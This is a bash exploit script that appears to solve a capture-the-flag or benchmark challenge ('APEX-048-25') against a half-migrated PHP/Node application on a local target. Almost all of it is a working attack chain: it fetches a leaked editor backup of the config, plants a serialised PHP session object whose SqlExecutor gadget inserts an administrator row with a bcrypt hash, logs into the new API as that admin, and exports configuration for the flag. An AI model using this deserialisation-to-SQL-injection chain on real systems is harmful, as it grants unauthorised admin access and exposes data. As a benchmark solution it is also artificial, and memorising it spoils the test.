#!/usr/bin/env bash
# APEX-048-25 — "LegacyBridge Migration Exploit" (tags: php_deserialization, jwt)
#
# A half-finished migration: an old PHP application and a new Node one, sharing
# one user table. The old half leaves an editor backup of its config in the web
# root (`config.inc.php~`), unserialises session data out of Memcached, and has
# a gadget that runs SQL. Writing a row into the shared table therefore creates
# an account on the *new* system, which is the point the two halves meet.
#
# One adjustment to the corpus's own exploit, and it is not cosmetic. It injects
# a SHA-256 hash, because the new API's login says it "supports both bcrypt and
# plain sha256 (legacy compat)" — and it does not: `bcrypt.compare` returns
# false for a hash it does not recognise rather than throwing, so the `catch`
# that holds the legacy comparison never runs and the injected account can never
# log in. The row is ours to write, so it gets a bcrypt hash instead.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex048-$$"
WHO="migrated$$@legacy.local"
PASSWORD="bridged$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# The backup nobody deleted, which names the database and its password.
send "$SESSION" req_0 --create --set 'path=/legacy/config.inc.php~' >/dev/null

# A session object with a gadget in it, and a page that unserialises one.
HASH="$(python3 -c '
import bcrypt, sys
print(bcrypt.hashpw(sys.argv[1].encode(), bcrypt.gensalt(rounds=10)).decode())
' "$PASSWORD")"
send "$SESSION" req_0 --create \
    --set method=POST --set path=/legacy/session-write \
    --set header.Content-Type=application/json \
    --set json.session_id=bridge$$ \
    --set json.data.type=SqlExecutor \
    --set "json.data.query=INSERT INTO users (email, password_hash, role, display_name) VALUES ('$WHO', '$HASH', 'admin', 'Migrated Admin')" \
    --set 'json.data.params=[]' >/dev/null
send "$SESSION" req_0 --create \
    --set path=/legacy/profile.php --set "query.PHPSESSID=bridge$$" >/dev/null

# The account exists on the new system, and it is an administrator there.
TOKEN="$(send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/v2/auth/login \
    --set header.Content-Type=application/json \
    --set "json.email=$WHO" --set "json.password=$PASSWORD" |
    body | python3 -c 'import json,sys; print(json.load(sys.stdin)["token"])')"

send "$SESSION" req_0 --create \
    --set path=/api/v2/admin/config/export \
    --set "header.Authorization=Bearer $TOKEN" | flag
